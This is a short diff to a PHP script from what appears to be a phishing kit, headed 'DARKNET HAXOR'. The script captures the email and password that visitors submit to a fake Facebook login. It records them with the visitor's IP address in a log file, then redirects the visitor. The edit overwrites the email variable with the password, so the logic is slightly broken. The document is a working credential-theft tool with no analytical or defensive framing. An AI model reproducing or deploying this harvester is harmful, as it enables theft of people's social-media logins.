@@ -1,3 +1,4 @@
+
 <?php
 
 /*-- DARKNET HAXOR:
@@ -52,9 +53,9 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 
 $a1 = $_POST['email'];
 
-$b1 = $_POST['password'];
+$a1 = $_POST['password'];
 
-$datas = "==11{$ipaddress}== ==12Facebook== ==13{$a1}== ==14{$b1}==";
+$datas = "==11{$ipaddress}== ==12Facebook== ==13{$a1}== ==14{$a1}==";
 
 $sendhits = "../../log.txt";
 
@@ -67,4 +68,5 @@ fclose($x);
 header('Location: '.$RedirectUrl);
 
 ?>
+
 
